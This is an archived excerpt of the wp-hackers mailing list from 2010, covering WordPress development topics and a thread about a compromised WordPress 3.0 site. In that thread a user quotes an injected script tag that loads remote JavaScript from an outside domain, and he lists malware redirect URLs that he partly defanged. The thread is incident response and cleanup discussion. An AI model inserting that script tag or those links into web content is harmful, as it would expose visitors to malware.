snippets and suggest to moderator to place them in appropriate places in
Codex.

If I am stuck with something wp related, I'd search codex and that's
where I
want those optimal code snippets as an example.

Whatever system you use should be integrated with this mailing list or
wp.org account, I am not keen on creating another account for yet
another
site.

Kind Regards,
Azizur Rahman

----

I would somehow need to integrate the mailing list into the site, and I
don't think that would work.

Kris

From office at wpseek.com  Wed Jul 21 18:21:27 2010
From: office at wpseek.com (=?ISO-8859-1?Q?Oliver_Schl=F6be?=)
Date: Wed, 21 Jul 2010 20:21:27 +0200
Subject: [wp-hackers] Comment Notification Emails
Message-ID: <4C473AA7.1030702@wpseek.com>

  Hey folks,

I just wondered one thing: Why don't comment notification e-mails link 
to the specific comment like

domain.com/post/#comment-1234

but instead link to the overall comment section like

domain.com/post/#comments ?

I mean, it can be hard on a post/page with 200+ comments to jump to the 
specific comment, especially with nested/threaded comments. New comments 
aren't necessarily added to the bottom of a comment tree.

Any thoughts?

- Oliver

-- 
Regards,
Oliver Schl?be

http://wpseek.com/
http://wpworldmap.net/

-- Code so clean you could eat off it.


From mikeschinkel at newclarity.net  Wed Jul 21 18:22:51 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 21 Jul 2010 13:22:51 -0500 (CDT)
Subject: [wp-hackers] wp-hackers.com
In-Reply-To: <AANLkTikHGEgqyWGlDWz4PBWkcLsK11uUcfa0KvsB-m2-@mail.gmail.com>
References: <000001cb28b1$87731620$96594260$@se>
	<3D777F1F-2907-4019-AAE4-F38ABE0809D4@newclarity.net>
	<AANLkTinVj6rF8Ceyerw7lKPm2jk9_ehfg8W2TqBl9k45@mail.gmail.com>
	<000501cb28b6$177f03b0$467d0b10$@se>
	<762D9470-F695-43DA-9430-C0B1D7CC9F8F@newclarity.net>
	<000e01cb28b9$06f213e0$14d63ba0$@se>
	<C3EDF9C2-630C-4A7E-84CE-5C6D6B9F45FD@newclarity.net>
	<CD47955B7E065D48AB5CF226C2ED75C02E3113@tbs-sbs01.TBS.local>
	<AANLkTikHGEgqyWGlDWz4PBWkcLsK11uUcfa0KvsB-m2-@mail.gmail.com>
Message-ID: <9AE8E7A5-5029-4192-A258-9FFD94629513@newclarity.net>

On Jul 21, 2010, at 10:24 AM, scribu <scribu at gmail.com> wrote:
> So what you're suggesting basically is a wiki for WP code snippets. It's an
> interesting idea.
> 
> Snippets could be locked from editing when the optimal solution is found or
> after a certain period.

That sounds an awful lot like a StackExchange, but only for code?

-Mike

From jason.blueluna at gmail.com  Wed Jul 21 18:36:21 2010
From: jason.blueluna at gmail.com (Jason LeVan)
Date: Wed, 21 Jul 2010 14:36:21 -0400
Subject: [wp-hackers] Comment Notification Emails
In-Reply-To: <4C473AA7.1030702@wpseek.com>
References: <4C473AA7.1030702@wpseek.com>
Message-ID: <54338E08-FB61-4EA1-8867-64BA541CF05B@gmail.com>

Wouldn't that cause some useless, or worse, broken links if the theme in use doesn't use the same comment id structure?

On Jul 21, 2010, at 2:21 PM, Oliver Schl?be <office at wpseek.com> wrote:

> Hey folks,
> 
> I just wondered one thing: Why don't comment notification e-mails link to the specific comment like
> 
> domain.com/post/#comment-1234
> 
> but instead link to the overall comment section like
> 
> domain.com/post/#comments ?
> 
> I mean, it can be hard on a post/page with 200+ comments to jump to the specific comment, especially with nested/threaded comments. New comments aren't necessarily added to the bottom of a comment tree.
> 
> Any thoughts?
> 
> - Oliver
> 
> -- 
> Regards,
> Oliver Schl?be
> 
> http://wpseek.com/
> http://wpworldmap.net/
> 
> -- Code so clean you could eat off it.
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From mikeschinkel at newclarity.net  Wed Jul 21 18:48:05 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 21 Jul 2010 14:48:05 -0400
Subject: [wp-hackers] Comment Notification Emails
In-Reply-To: <54338E08-FB61-4EA1-8867-64BA541CF05B@gmail.com>
References: <4C473AA7.1030702@wpseek.com>
	<54338E08-FB61-4EA1-8867-64BA541CF05B@gmail.com>
Message-ID: <673C2828-8AEB-49AC-BB2B-1D9F9847F739@newclarity.net>

+1 to adding direct links to comments. Following the Thesis discussion on several WordPress blogs really reminded me of this.

As for the comment id structure, wp_list_comments() could optionally add them for new blogs.  I think it could be handled in a backward compatible manner.

-Mike


On Jul 21, 2010, at 2:36 PM, Jason LeVan wrote:

> Wouldn't that cause some useless, or worse, broken links if the theme in use doesn't use the same comment id structure?
> 
> On Jul 21, 2010, at 2:21 PM, Oliver Schl?be <office at wpseek.com> wrote:
> 
>> Hey folks,
>> 
>> I just wondered one thing: Why don't comment notification e-mails link to the specific comment like
>> 
>> domain.com/post/#comment-1234
>> 
>> but instead link to the overall comment section like
>> 
>> domain.com/post/#comments ?
>> 
>> I mean, it can be hard on a post/page with 200+ comments to jump to the specific comment, especially with nested/threaded comments. New comments aren't necessarily added to the bottom of a comment tree.
>> 
>> Any thoughts?
>> 
>> - Oliver
>> 
>> -- 
>> Regards,
>> Oliver Schl?be
>> 
>> http://wpseek.com/
>> http://wpworldmap.net/
>> 
>> -- Code so clean you could eat off it.
>> 
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From paul at codehooligans.com  Wed Jul 21 18:51:46 2010
From: paul at codehooligans.com (Paul)
Date: Wed, 21 Jul 2010 14:51:46 -0400
Subject: [wp-hackers] wp-hackers.com
In-Reply-To: <9AE8E7A5-5029-4192-A258-9FFD94629513@newclarity.net>
References: <000001cb28b1$87731620$96594260$@se>
	<3D777F1F-2907-4019-AAE4-F38ABE0809D4@newclarity.net>
	<AANLkTinVj6rF8Ceyerw7lKPm2jk9_ehfg8W2TqBl9k45@mail.gmail.com>
	<000501cb28b6$177f03b0$467d0b10$@se>
	<762D9470-F695-43DA-9430-C0B1D7CC9F8F@newclarity.net>
	<000e01cb28b9$06f213e0$14d63ba0$@se>
	<C3EDF9C2-630C-4A7E-84CE-5C6D6B9F45FD@newclarity.net>
	<CD47955B7E065D48AB5CF226C2ED75C02E3113@tbs-sbs01.TBS.local>
	<AANLkTikHGEgqyWGlDWz4PBWkcLsK11uUcfa0KvsB-m2-@mail.gmail.com>
	<9AE8E7A5-5029-4192-A258-9FFD94629513@newclarity.net>
Message-ID: <22462E75-924F-41DD-8796-0E8DC8A8AAF8@codehooligans.com>

Agree with Mike. Was just about to comment it sounds like some other external site hosted outside of the WP domains. I for one would like to see more code snippets and example within the existing Codex. Then again the code is sort of the documentation for the deeper issues. 

Also, and I'm not even sure how possible this it. I'm contacted by people using my plugins about how to call some of the plugin functions directly. I know this is more a plugin documentation issue on my end. I think it would be nice to somehow have a snippets file as part of the plugin which can contain some of the non-standard examples. Then given it's in the plugin repo these snippets can somehow be pulled into a Codex or like place and made viewable via a searchable web interface. Just a thought. 

P-


On Jul 21, 2010, at 2:22 PM, Mike Schinkel wrote:

> On Jul 21, 2010, at 10:24 AM, scribu <scribu at gmail.com> wrote:
>> So what you're suggesting basically is a wiki for WP code snippets. It's an
>> interesting idea.
>> 
>> Snippets could be locked from editing when the optimal solution is found or
>> after a certain period.
> 
> That sounds an awful lot like a StackExchange, but only for code?
> 
> -Mike
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From wp at andrewnacin.com  Wed Jul 21 18:57:58 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Wed, 21 Jul 2010 14:57:58 -0400
Subject: [wp-hackers] Comment Notification Emails
In-Reply-To: <673C2828-8AEB-49AC-BB2B-1D9F9847F739@newclarity.net>
References: <4C473AA7.1030702@wpseek.com>
	<54338E08-FB61-4EA1-8867-64BA541CF05B@gmail.com> 
	<673C2828-8AEB-49AC-BB2B-1D9F9847F739@newclarity.net>
Message-ID: <AANLkTik_zGtxhj-UeA8gFvXkyBexYhadAJKn-_ykWWP3@mail.gmail.com>

On Wed, Jul 21, 2010 at 2:48 PM, Mike Schinkel
<mikeschinkel at newclarity.net>wrote:

> As for the comment id structure, wp_list_comments() could optionally add
> them for new blogs.  I think it could be handled in a backward compatible
> manner.
>

#comment-$id is already in wp_list_comments(), so there you go.

From scribu at gmail.com  Wed Jul 21 20:11:40 2010
From: scribu at gmail.com (scribu)
Date: Wed, 21 Jul 2010 23:11:40 +0300
Subject: [wp-hackers] pre_get_posts problem
In-Reply-To: <AANLkTincremiNrvDXjNpW_mYrpuROyrjbK345rqAmkg0@mail.gmail.com>
References: <AANLkTik2qEdPZ4u41aAqfJGXY7V7vi1f4ql8olZ3XYvU@mail.gmail.com>
	<AANLkTincremiNrvDXjNpW_mYrpuROyrjbK345rqAmkg0@mail.gmail.com>
Message-ID: <AANLkTin-vXqCSr1HHkWlJhcSPEYga6vnaQhXRf7HwsMg@mail.gmail.com>

On Wed, Jul 21, 2010 at 8:14 AM, Andrew Nacin <wp at andrewnacin.com> wrote:

> This is one of the dangers/pitfalls of using pre_get_posts. It seems to be
> recommended often for some reason when dealing with custom post types, but
> it is much better to modify the request itself, versus any old get_posts or
> WP_Query call.
>

I think the reason it's recommended often is that people usually start
looking into the WP_Query class first and 'pre_get_posts' looks like the
right place to hook into.


-- 
http://scribu.net

From aaron at jorb.in  Wed Jul 21 20:35:07 2010
From: aaron at jorb.in (Aaron Jorbin)
Date: Wed, 21 Jul 2010 16:35:07 -0400
Subject: [wp-hackers] pre_get_posts problem
In-Reply-To: <AANLkTin-vXqCSr1HHkWlJhcSPEYga6vnaQhXRf7HwsMg@mail.gmail.com>
References: <AANLkTik2qEdPZ4u41aAqfJGXY7V7vi1f4ql8olZ3XYvU@mail.gmail.com> 
	<AANLkTincremiNrvDXjNpW_mYrpuROyrjbK345rqAmkg0@mail.gmail.com> 
	<AANLkTin-vXqCSr1HHkWlJhcSPEYga6vnaQhXRf7HwsMg@mail.gmail.com>
Message-ID: <AANLkTinls6BBSLW9vE27jZpbiVPEBhOSPo_mnD9JlHOt@mail.gmail.com>

On Wed, Jul 21, 2010 at 4:11 PM, scribu <scribu at gmail.com> wrote:


> I think the reason it's recommended often is that people usually start
> looking into the WP_Query class first and 'pre_get_posts' looks like the
> right place to hook into.
>

It is a very enticing name, and most of the articles related to Custom Post
types I've seen recommend using it.  I think we need to do some better
eduction and getting the word out on the other, more appropriate filters.


http://aaron.jorb.in
twitter: twitter.com/aaronjorbin

From info at toscho.de  Wed Jul 21 21:13:36 2010
From: info at toscho.de (Thomas Scholz)
Date: Wed, 21 Jul 2010 23:13:36 +0200
Subject: [wp-hackers] pre_get_posts problem
In-Reply-To: <AANLkTin-vXqCSr1HHkWlJhcSPEYga6vnaQhXRf7HwsMg@mail.gmail.com>
References: <AANLkTik2qEdPZ4u41aAqfJGXY7V7vi1f4ql8olZ3XYvU@mail.gmail.com>
	<AANLkTincremiNrvDXjNpW_mYrpuROyrjbK345rqAmkg0@mail.gmail.com>
	<AANLkTin-vXqCSr1HHkWlJhcSPEYga6vnaQhXRf7HwsMg@mail.gmail.com>
Message-ID: <op.vf7o8yxdr6yny2@perplexifikator.speedport-w-303v-typ-a>

scribu:

> On Wed, Jul 21, 2010 at 8:14 AM, Andrew Nacin <wp at andrewnacin.com> wrote:
>
>> This is one of the dangers/pitfalls of using pre_get_posts. It seems to  
>> be recommended often for some reason when dealing with custom post  
>> types, but it is much better to modify the request itself, versus any  
>> old get_posts or WP_Query call.
>>
>
> I think the reason it's recommended often is that people usually start
> looking into the WP_Query class first and 'pre_get_posts' looks like the
> right place to hook into.

Maybe a comment above this filter with pointers to better places would be  
useful?

Regards
Thomas

-- 
http://toscho.de

From nanobar at gmail.com  Wed Jul 21 21:25:25 2010
From: nanobar at gmail.com (Lance Willett)
Date: Wed, 21 Jul 2010 15:25:25 -0600
Subject: [wp-hackers] Comment Notification Emails
In-Reply-To: <4C473AA7.1030702@wpseek.com>
References: <4C473AA7.1030702@wpseek.com>
Message-ID: <AANLkTikBo9t-K41XMazSckKfhQycn4N2VhfCjPMZ74xQ@mail.gmail.com>

> I just wondered one thing: Why don't comment notification e-mails link to
> the specific comment

I added a ticket for this 4 months ago:
http://core.trac.wordpress.org/ticket/12797

Will hopefully make it into a future version. :)

> Wouldn't that cause some useless, or worse, broken links if the theme in use doesn't use the same comment id structure?

It wouldn't be broken as you'd still reach the comments page. But,
themes should already be using wp_list_comments() anyway.

-Lance

From 24-7 at gmx.net  Wed Jul 21 21:26:00 2010
From: 24-7 at gmx.net (24/7)
Date: Wed, 21 Jul 2010 14:26:00 -0700 (PDT)
Subject: [wp-hackers] 3.0 site got hacked
Message-ID: <7b9d7c7d-a66d-446c-ba48-c66a2738fab8@u26g2000yqu.googlegroups.com>

Hi list,

note that this is just FYI.

My (never finished) portfolio-site got hacked in the last days (after
the upgrade to 3.0). Sadly i was that shocked, that i just reinstalled
my theme and wp, that i forgot to download & look over my code what
exactly got hacked. I could now just search through my chronik to find
the links. First i had the problem, that no page/post/whatever except
the index/landing/front page was accessable (404). I thought i killed
some parts of my page after plugin and wp updates. I deleted nearly
all plugins and themes except hybrid theme. I left hybrid to see if i
could access the posts via the preview of hybrid. Most of the pages
left me with a 404, but one brought me to the following sites:

(i break the link with "__." after the http:// to make it unaccessable
for someone who may find and click it accidently)

1) http://__.www3.doligz30td.co.cc/?p=p52dcWplbW%2BHnc3KbmNToKV1lFPWpJyjX5TJl2JvY2fLksg%3D
2) http://__.www.google.md
3)
http://__.www1.greedpays10.co.cc/?p=p52dcWplbW%2BHjsbIo22AgXOOipnVbWGWZInT1m6uqG2Lw8ydb5aYen5arK3NapaXlmRebGNpyl7HVqPajtfZ1m5oWKeih9eipqCecV6aoaXGaorcmpWkcVih1GqaYF6XXZySmWFlY2%2Bch9WemHGhqKykcmiQotLZlqKYlZuryZ%2BQk5%2FTXKLU1Zatm5vcnpRfk6Gpb6yZpanNjtjLbqSVmZ%2BZ2JbFVpHTnZ7X16qjl6nNxsitb6ihmaWVrKLEU8XToWtTqKV1lV%2BZaWeYXpyam1erpWiikpVwa2trZXFqcF%2FEkKGnhVaknZZ1nWCX

Maybe someone found something similar. I would suggest to contact me
direct, so we don't clutter the list unless someone knows what exactly
was the cause. You can do otherwise too, if you want. Thanks.

-K.

From dre at sucuri.net  Wed Jul 21 21:44:44 2010
From: dre at sucuri.net (Dre Armeda)
Date: Wed, 21 Jul 2010 14:44:44 -0700
Subject: [wp-hackers] 3.0 site got hacked
In-Reply-To: <7b9d7c7d-a66d-446c-ba48-c66a2738fab8@u26g2000yqu.googlegroups.com>
References: <7b9d7c7d-a66d-446c-ba48-c66a2738fab8@u26g2000yqu.googlegroups.com>
Message-ID: <4C476A4C.20805@armeda.com>

On 7/21/10 2:26 PM, 24/7 wrote:
> Hi list,
>
> note that this is just FYI.
>
> My (never finished) portfolio-site got hacked in the last days (after
> the upgrade to 3.0).
The title of this is misleading. Have you confirmed 3.0 was the route 
cause? Can you provide a detailed exploit vector?

We've been seeing a lot of malware on various hosts as of late causing 
SEO poisoning (Pharma Hack) and redirects. These are not 3.0 issues. In 
a lot of cases this happens on really old versions of applications, and 
poorly managed shared hosts.

What version did you upgrade from? Do you have a shared hosting account 
and with who?

> Sadly i was that shocked, that i just reinstalled
> my theme and wp, that i forgot to download&  look over my code what
> exactly got hacked. I could now just search through my chronik to find
> the links. First i had the problem, that no page/post/whatever except
> the index/landing/front page was accessable (404). I thought i killed
> some parts of my page after plugin and wp updates. I deleted nearly
> all plugins and themes except hybrid theme. I left hybrid to see if i
> could access the posts via the preview of hybrid. Most of the pages
> left me with a 404, but one brought me to the following sites:
>
> (i break the link with "__." after the http:// to make it unaccessable
> for someone who may find and click it accidently)
>
> 1) http://__.www3.doligz30td.co.cc/?p=p52dcWplbW%2BHnc3KbmNToKV1lFPWpJyjX5TJl2JvY2fLksg%3D
>    
Scan results for this site:
http://sucuri.net/?page=saved-scan&scan=fb65af3bdd3152ba289ecb23c5d366af-saved

> 2) http://__.www.google.md
>    
This is a legitimate site

> 3)
> http://__.www1.greedpays10.co.cc/?p=p52dcWplbW%2BHjsbIo22AgXOOipnVbWGWZInT1m6uqG2Lw8ydb5aYen5arK3NapaXlmRebGNpyl7HVqPajtfZ1m5oWKeih9eipqCecV6aoaXGaorcmpWkcVih1GqaYF6XXZySmWFlY2%2Bch9WemHGhqKykcmiQotLZlqKYlZuryZ%2BQk5%2FTXKLU1Zatm5vcnpRfk6Gpb6yZpanNjtjLbqSVmZ%2BZ2JbFVpHTnZ7X16qjl6nNxsitb6ihmaWVrKLEU8XToWtTqKV1lV%2BZaWeYXpyam1erpWiikpVwa2trZXFqcF%2FEkKGnhVaknZZ1nWCX
>
>    
Scan results for this site:
http://sucuri.net/?page=saved-scan&scan=281ce27bd83c5fb888ccb1d15e1829ff-saved

> Maybe someone found something similar. I would suggest to contact me
> direct, so we don't clutter the list unless someone knows what exactly
> was the cause. You can do otherwise too, if you want. Thanks.
>    

Those two sites are definitely serving malware but unless you can prove 
without a doubt it is WordPress 3.0, please don't write that it's hacked.

Thanks,

Dre armeda
> -K.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>    

From 24-7 at gmx.net  Wed Jul 21 22:13:39 2010
From: 24-7 at gmx.net (24/7)
Date: Wed, 21 Jul 2010 15:13:39 -0700 (PDT)
Subject: [wp-hackers] 3.0 site got hacked
In-Reply-To: <4C476A4C.20805@armeda.com>
References: 4C476A4C.20805@armeda.com
Message-ID: <614c75cc-ccc5-4437-8e85-72d44f168c90@l14g2000yql.googlegroups.com>

> > note that this is just FYI.

..As i said: FYI... and explained below, that the hack happend after
the upgrade.

> > My (never finished) portfolio-site got hacked in the last days (after
> > the upgrade to 3.0).
>
> The title of this is misleading. Have you confirmed 3.0 was the route
> cause? Can you provide a detailed exploit vector?

...as written in the first mail: no i can't. If you read it
completely: it's explained why not (and i know it's my failure).

>
> What version did you upgrade from? Do you have a shared hosting account
> and with who?

Updated from 2.9.2. Hosted at (mt)'s Gridserver (gs).

> > 2) http://__.www.google.md
>
> This is a legitimate site

Thanks. Didn't know. Just found it in the middle of both links in the
chronic of ff and wondered.

Due to the fact, that there were that many Qs, i didn't write below
and answered directly.

From aaron at jorb.in  Wed Jul 21 22:39:22 2010
From: aaron at jorb.in (Aaron Jorbin)
Date: Wed, 21 Jul 2010 18:39:22 -0400
Subject: [wp-hackers] 3.0 site got hacked
In-Reply-To: <4C476A4C.20805@armeda.com>
References: <7b9d7c7d-a66d-446c-ba48-c66a2738fab8@u26g2000yqu.googlegroups.com>
	<4C476A4C.20805@armeda.com>
Message-ID: <AANLkTilFR12XPz2XDaBAeYqurGkiE4J5DY-yUBub76qB@mail.gmail.com>

Your host seems to be having some problems:

http://weblog.mediatemple.net/weblog/category/system-incidents/1378-information-about-compromised-sites/

http://aaron.jorb.in
twitter: twitter.com/aaronjorbin


On Wed, Jul 21, 2010 at 5:44 PM, Dre Armeda <dre at sucuri.net> wrote:

> On 7/21/10 2:26 PM, 24/7 wrote:
>
>> Hi list,
>>
>> note that this is just FYI.
>>
>> My (never finished) portfolio-site got hacked in the last days (after
>> the upgrade to 3.0).
>>
> The title of this is misleading. Have you confirmed 3.0 was the route
> cause? Can you provide a detailed exploit vector?
>
> We've been seeing a lot of malware on various hosts as of late causing SEO
> poisoning (Pharma Hack) and redirects. These are not 3.0 issues. In a lot of
> cases this happens on really old versions of applications, and poorly
> managed shared hosts.
>
> What version did you upgrade from? Do you have a shared hosting account and
> with who?
>
>
>  Sadly i was that shocked, that i just reinstalled
>> my theme and wp, that i forgot to download&  look over my code what
>> exactly got hacked. I could now just search through my chronik to find
>> the links. First i had the problem, that no page/post/whatever except
>> the index/landing/front page was accessable (404). I thought i killed
>> some parts of my page after plugin and wp updates. I deleted nearly
>> all plugins and themes except hybrid theme. I left hybrid to see if i
>> could access the posts via the preview of hybrid. Most of the pages
>> left me with a 404, but one brought me to the following sites:
>>
>> (i break the link with "__." after the http:// to make it unaccessable
>> for someone who may find and click it accidently)
>>
>> 1) http://__.
>> www3.doligz30td.co.cc/?p=p52dcWplbW%2BHnc3KbmNToKV1lFPWpJyjX5TJl2JvY2fLksg%3D
>>
>>
> Scan results for this site:
>
> http://sucuri.net/?page=saved-scan&scan=fb65af3bdd3152ba289ecb23c5d366af-saved
>
>
>  2) http://__.www.google.md
>>
>>
> This is a legitimate site
>
>
>  3)
>> http://__.
>> www1.greedpays10.co.cc/?p=p52dcWplbW%2BHjsbIo22AgXOOipnVbWGWZInT1m6uqG2Lw8ydb5aYen5arK3NapaXlmRebGNpyl7HVqPajtfZ1m5oWKeih9eipqCecV6aoaXGaorcmpWkcVih1GqaYF6XXZySmWFlY2%2Bch9WemHGhqKykcmiQotLZlqKYlZuryZ%2BQk5%2FTXKLU1Zatm5vcnpRfk6Gpb6yZpanNjtjLbqSVmZ%2BZ2JbFVpHTnZ7X16qjl6nNxsitb6ihmaWVrKLEU8XToWtTqKV1lV%2BZaWeYXpyam1erpWiikpVwa2trZXFqcF%2FEkKGnhVaknZZ1nWCX
>>
>>
>>
> Scan results for this site:
>
> http://sucuri.net/?page=saved-scan&scan=281ce27bd83c5fb888ccb1d15e1829ff-saved
>
>
>  Maybe someone found something similar. I would suggest to contact me
>> direct, so we don't clutter the list unless someone knows what exactly
>> was the cause. You can do otherwise too, if you want. Thanks.
>>
>>
>
> Those two sites are definitely serving malware but unless you can prove
> without a doubt it is WordPress 3.0, please don't write that it's hacked.
>
> Thanks,
>
> Dre armeda
>
>  -K.
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From harper.shelby at parivedasolutions.com  Wed Jul 21 23:28:42 2010
From: harper.shelby at parivedasolutions.com (Shelby, Harper)
Date: Wed, 21 Jul 2010 18:28:42 -0500
Subject: [wp-hackers] Filtering Themes visible for a particular network
In-Reply-To: <AANLkTinXQ_gXC36KmPRUCR96oqUn-rKrBGNLP308H2rC@mail.gmail.com>
References: <2BB24BBC87D490418DE901138ACDA0DB42092C8893@srv-exch-02.pariveda.local>
	<AANLkTilnSW5FBMRJjHWIWWl_p_V8RSop44dYFEig4_lF@mail.gmail.com>
	<AANLkTinXQ_gXC36KmPRUCR96oqUn-rKrBGNLP308H2rC@mail.gmail.com>
Message-ID: <2BB24BBC87D490418DE901138ACDA0DB42092C9259@srv-exch-02.pariveda.local>

Andrew,
        Thanks for your help. I've successfully moved the themes into site_id-based folders, and they can all be seen, however this appears to have only fixed that part of the problem. As a network admin (OK, I've only tested this with *the* admin, but I had assumed it would still work in that case), I can see all of the themes no matter which network I'm logged in to, and if I enable them in the Super Admin->Themes menu, then the individual sites can see them even if they're not part of that network. Is there anything I'm missing here - I noticed that register_theme_director() just adds to the global $wp_theme_directories - is that the core of the problem, or is it the use of the original site admin login that could cause this?

Thanks,
Harper

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Andrew Nacin
Sent: Tuesday, July 20, 2010 5:17 PM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Filtering Themes visible for a particular network

On Tue, Jul 20, 2010 at 6:10 PM, Andrew Nacin <wp at andrewnacin.com> wrote:

> On Tue, Jul 20, 2010 at 5:59 PM, Shelby, Harper <
> harper.shelby at parivedasolutions.com> wrote:
>
>> I've been asked to implement theme filtering for a multi-network
>> installation, so that network admins only see those themes which "belong" to
>> them. In the existing installation (on MU 2.9.2), this was done by altering
>> wpmu-themes to check for a Tags value in the theme's CSS file and filtering
>> based on that. I'm trying to move this implementation into a plugin to
>> reduce changes to the core code. Digging into the code, I don't see any
>> action or filter hooks being called in ms-themes.php, so I suspect my best
>> course of action is to move themes into network-specific subdirectories of
>> wp-content/themes, then alter the include path in an admin_init hook to
>> bring in the proper theme directory. Is there a better way to implement
>> this, or are there any potential risks that I haven't seen in this course of
>> action?
>>
>
> You can indeed register theme directories in a plugin. In fact that seems
> like a very sane way of doing this (as long as you don't expect a theme to
> be used across networks).
>

What I meant was, no need for admin_init modifications or anything of the
sort. Check out register_theme_directory(). So you could simply have a
plugin that calls register_theme_directory( WP_CONTENT_DIR .
'/network-themes/' . $current_site->site_id ); and you'd be good to go.

Also, I'd upgrade to 3.0 when you can (perhaps with 3.0.1), there's a decent
number of MU improvements and bug fixes that went into that release.
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

The information transmitted is intended only for the person or entity to which it is addressed and may contain confidential and/or privileged material. Any review, retransmission, dissemination or other use of, or taking of any action in reliance upon, this information by persons or entities other than the intended recipient is prohibited. If you received this in error, please contact the sender and delete the material from any computer.

From wp at andrewnacin.com  Thu Jul 22 01:00:08 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Wed, 21 Jul 2010 21:00:08 -0400
Subject: [wp-hackers] 3.0 site got hacked
In-Reply-To: <AANLkTilFR12XPz2XDaBAeYqurGkiE4J5DY-yUBub76qB@mail.gmail.com>
References: <7b9d7c7d-a66d-446c-ba48-c66a2738fab8@u26g2000yqu.googlegroups.com>
	<4C476A4C.20805@armeda.com>
	<AANLkTilFR12XPz2XDaBAeYqurGkiE4J5DY-yUBub76qB@mail.gmail.com>
Message-ID: <AANLkTimtzKq4xBuwGeEnQxaP_rCAidtzgY8Z8WZwhZLZ@mail.gmail.com>

On Wed, Jul 21, 2010 at 6:39 PM, Aaron Jorbin <aaron at jorb.in> wrote:

> Your host seems to be having some problems:
>
>
> http://weblog.mediatemple.net/weblog/category/system-incidents/1378-information-about-compromised-sites/
>


Another good link from them:
http://weblog.mediatemple.net/weblog/2010/07/21/am-i-hacked-security-explanations-from-mt/

<http://weblog.mediatemple.net/weblog/2010/07/21/am-i-hacked-security-explanations-from-mt/>Of
course, had this actually been a security issue in WordPress, the proper
email would have been security at wordpress.org, not a list with two thousand
subscribers.

From 24-7 at gmx.net  Thu Jul 22 02:05:02 2010
From: 24-7 at gmx.net (24/7)
Date: Wed, 21 Jul 2010 19:05:02 -0700 (PDT)
Subject: [wp-hackers] 3.0 site got hacked
In-Reply-To: <AANLkTimtzKq4xBuwGeEnQxaP_rCAidtzgY8Z8WZwhZLZ@mail.gmail.com>
References: <7b9d7c7d-a66d-446c-ba48-c66a2738fab8@u26g2000yqu.googlegroups.com>
	<4C476A4C.20805@armeda.com>
	<AANLkTilFR12XPz2XDaBAeYqurGkiE4J5DY-yUBub76qB@mail.gmail.com> 
	<AANLkTimtzKq4xBuwGeEnQxaP_rCAidtzgY8Z8WZwhZLZ@mail.gmail.com>
Message-ID: <9f17a24f-923e-499f-84d6-601894738c0f@d37g2000yqm.googlegroups.com>

> Your host seems to be having some problems:
>
> http://weblog.mediatemple.net/weblog/category/system-incidents/1378-i...

Thanks Andrew. Hot Tip. I had already checked the users and still only
have one user. But when looking into the db, there where about 400 new
posts (other content titles were doubled) all containing:

<script src="http://ae.awaue.com/7"></script>

(If you take a look at the domain, then you can read the plain
script). I wonder why they don't show up in the admin-UI.

I still don't know how this got into my system. I'm now searching for
a SQL-query to delete all the scripts. Pretty tired now, but maybe
it's possible with a normal query und some update post content
function. If someone has any idea or done this before: I'd love to
hear from you. Thanks a lot!

From me at piyushmishra.com  Thu Jul 22 04:21:06 2010
From: me at piyushmishra.com (Piyush Mishra)
Date: Thu, 22 Jul 2010 09:51:06 +0530
Subject: [wp-hackers] 3.0 site got hacked
In-Reply-To: <9f17a24f-923e-499f-84d6-601894738c0f@d37g2000yqm.googlegroups.com>
References: <7b9d7c7d-a66d-446c-ba48-c66a2738fab8@u26g2000yqu.googlegroups.com>
	<4C476A4C.20805@armeda.com>
	<AANLkTilFR12XPz2XDaBAeYqurGkiE4J5DY-yUBub76qB@mail.gmail.com>
	<AANLkTimtzKq4xBuwGeEnQxaP_rCAidtzgY8Z8WZwhZLZ@mail.gmail.com>
	<9f17a24f-923e-499f-84d6-601894738c0f@d37g2000yqm.googlegroups.com>
Message-ID: <AANLkTikeNsSHO0jdHO-bq7s1VGjqLIsQsC-gLTCBIqZT@mail.gmail.com>

for the time being make a plugin for the_content and str_replace the
script to an empty string.

after tht try n solve things with your host before wasting time in
fixing things coz the attacks will come right back...

On 7/22/10, 24/7 <24-7 at gmx.net> wrote:
>> Your host seems to be having some problems:
>>
>> http://weblog.mediatemple.net/weblog/category/system-incidents/1378-i...
>
> Thanks Andrew. Hot Tip. I had already checked the users and still only
> have one user. But when looking into the db, there where about 400 new
> posts (other content titles were doubled) all containing:
>
> <script src="http://ae.awaue.com/7"></script>
>
> (If you take a look at the domain, then you can read the plain
> script). I wonder why they don't show up in the admin-UI.
>
> I still don't know how this got into my system. I'm now searching for
> a SQL-query to delete all the scripts. Pretty tired now, but maybe
> it's possible with a normal query und some update post content
> function. If someone has any idea or done this before: I'd love to
> hear from you. Thanks a lot!
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


-- 
Regards
Piyush Mishra
http://www.piyushmishra.com/
Life's Short, Live it to the maximum

From cross at thisismyurl.com  Thu Jul 22 15:18:03 2010
From: cross at thisismyurl.com (Christopher Ross)
Date: Thu, 22 Jul 2010 12:18:03 -0300
Subject: [wp-hackers] Boston.com article with interesting WP stats
